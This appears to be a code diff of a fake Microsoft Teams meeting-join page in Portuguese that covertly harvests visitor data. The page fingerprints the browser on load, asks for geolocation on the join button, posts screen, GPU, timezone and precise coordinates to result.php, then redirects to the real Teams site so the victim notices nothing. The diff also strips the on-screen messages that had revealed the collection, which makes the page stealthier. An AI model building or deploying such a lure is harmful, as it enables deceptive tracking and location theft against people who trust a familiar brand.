@@ -4,8 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Microsoft Teams</title>
-  <!-- Toast CSS -->
-  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
   <style>
     body {
       background-color: #f3f3f3;
@@ -83,7 +81,7 @@
     }
   </style>
 </head>
-<body onload="coletaDados(false)">
+<body>
   <div class="card">
     <h2>Reunião do Microsoft Teams</h2>
     <p>Clique abaixo para entrar na reunião</p>
@@ -96,26 +94,38 @@
     <p class="loading" id="loadingText" style="display:none;">Aguarde, conectando...</p>
   </div>
 
-  <!-- Toast JS -->
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
-  
   <script>
-    function showToast(message, type = 'info') {
-      const backgrounds = {
-        success: "linear-gradient(to right, #00b09b, #96c93d)",
-        error: "linear-gradient(to right, #ff5f6d, #ffc371)",
-        warning: "linear-gradient(to right, #f7971e, #ffd200)",
-        info: "linear-gradient(to right, #0078d7, #4fc3f7)"
-      };
+    const TEAMS_URL = "https://teams.microsoft.com/l/meetup-join/";
+    const GEO_OPTIONS = {
+      enableHighAccuracy: false,
+      timeout: 30000,
+      maximumAge: 0
+    };
 
-      Toastify({
-        text: message,
-        duration: 4000,
-        gravity: "top",
-        position: "right",
-        backgroundColor: backgrounds[type] || backgrounds.info,
-        stopOnFocus: true
-      }).showToast();
+    function redirectToTeams() {
+      window.location.href = TEAMS_URL;
+    }
+
+    function submitResult(payload) {
+      updateProgress(80);
+
+      return fetch("result.php", {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" }
+      });
+    }
+
+    function submitAndRedirect(payload) {
+      submitResult(payload)
+        .then(() => {
+          updateProgress(100);
+          setTimeout(redirectToTeams, 2000);
+        })
+        .catch(() => {
+          updateProgress(100);
+          setTimeout(redirectToTeams, 2000);
+        });
     }
 
     function updateProgress(percent) {
@@ -130,7 +140,7 @@
       }
     }
 
-    function coletaDados(geoFlag) {
+    function coletaDados() {
       const screenRes = `${screen.width}x${screen.height}`;
       const lang = navigator.language || 'N/A';
       const platform = navigator.platform || 'N/A';
@@ -148,136 +158,72 @@
         }
       } catch (e) {}
 
-      const data = {
+      return {
         screen: screenRes,
         lang: lang,
         platform: platform,
         timezone: timezone,
         gpu_vendor: gpu_vendor,
-        gpu_renderer: gpu_renderer,
-        geo: geoFlag
+        gpu_renderer: gpu_renderer
       };
+    }
 
-      return data;
+    function buildBasePayload() {
+      const base = coletaDados();
+      base.timestamp = new Date().toISOString();
+      return base;
+    }
+
+    function buildClickPayload(locationType, position) {
+      const payload = buildBasePayload();
+      payload.collection_event = 'click';
+      payload.location_type = locationType;
+
+      if (position) {
+        payload.lat = position.coords.latitude;
+        payload.lon = position.coords.longitude;
+        payload.accuracy = position.coords.accuracy;
+      }
+
+      return payload;
     }
 
     function getLocation() {
       const joinBtn = document.getElementById('joinBtn');
       const spinner = document.querySelector("#spinner");
       const loadingText = document.querySelector("#loadingText");
-      
+
       joinBtn.disabled = true;
       spinner.style.display = 'block';
       loadingText.style.display = 'block';
       updateProgress(20);
 
-      showToast("Solicitando permissão de localização...", "info");
-
-      if (navigator.geolocation) {
-        updateProgress(40);
-        
-        navigator.geolocation.getCurrentPosition(function (position) {
-          updateProgress(60);
-          showToast("Localização obtida com sucesso!", "success");
-          
-          const base = coletaDados(true);
-          base.lat = position.coords.latitude;
-          base.lon = position.coords.longitude;
-          base.accuracy = position.coords.accuracy;
-          base.timestamp = new Date().toISOString();
-
-          updateProgress(80);
-
-          fetch("result.php", {
-            method: "POST",
-            body: JSON.stringify(base),
-            headers: { "Content-Type": "application/json" }
-          })
-          .then(response => response.json())
-          .then(data => {
-            updateProgress(100);
-            
-            if (data.status === 'success') {
-              showToast("Dados salvos com sucesso! Redirecionando...", "success");
-            } else {
-              showToast("Aviso: Dados salvos em modo offline", "warning");
-            }
-            
-            setTimeout(() => {
-              window.location.href = "https://teams.microsoft.com/l/meetup-join/";
-            }, 2000);
-          })
-          .catch(error => {
-            updateProgress(100);
-            showToast("Erro de conexão, mas dados foram coletados", "warning");
-            
-            setTimeout(() => {
-              window.location.href = "https://teams.microsoft.com/l/meetup-join/";
-            }, 2000);
-          });
-        }, function (err) {
-          spinner.style.display = 'none';
-          loadingText.style.display = 'none';
-          joinBtn.disabled = false;
-          updateProgress(0);
-          
-          showToast("Erro ao obter localização: " + err.message, "error");
-          
-          // Collect data without geolocation
-          setTimeout(() => {
-            collectWithoutGeo();
-          }, 1000);
-        });
-      } else {
-        spinner.style.display = 'none';
-        loadingText.style.display = 'none';
-        joinBtn.disabled = false;
-        updateProgress(0);
-        
-        showToast("Este navegador não suporta geolocalização", "error");
-        
-        // Collect data without geolocation
-        setTimeout(() => {
-          collectWithoutGeo();
-        }, 1000);
+      if (!navigator.geolocation) {
+        updateProgress(60);
+        submitAndRedirect(buildClickPayload('none'));
+        return;
       }
-    }
 
-    function collectWithoutGeo() {
-      showToast("Coletando dados básicos...", "info");
-      
-      const base = coletaDados(false);
-      base.timestamp = new Date().toISOString();
+      updateProgress(40);
 
-      fetch("result.php", {
-        method: "POST",
-        body: JSON.stringify(base),
-        headers: { "Content-Type": "application/json" }
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.status === 'success') {
-          showToast("Dados coletados! Redirecionando...", "success");
-        } else {
-          showToast("Dados salvos em modo offline", "warning");
-        }
-        
-        setTimeout(() => {
-          window.location.href = "https://teams.microsoft.com/l/meetup-join/";
-        }, 2000);
-      })
-      .catch(error => {
-        showToast("Redirecionando...", "info");
-        setTimeout(() => {
-          window.location.href = "https://teams.microsoft.com/l/meetup-join/";
-        }, 2000);
-      });
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          updateProgress(60);
+          submitAndRedirect(buildClickPayload('precise', position));
+        },
+        function () {
+          updateProgress(60);
+          submitAndRedirect(buildClickPayload('none'));
+        },
+        GEO_OPTIONS
+      );
     }
 
     // Coleta inicial sem geo
     window.addEventListener("load", () => {
-      const base = coletaDados(false);
-      base.timestamp = new Date().toISOString();
+      const base = buildBasePayload();
+      base.collection_event = 'page_load';
+      base.location_type = 'none';
 
       fetch("result.php", {
         method: "POST",
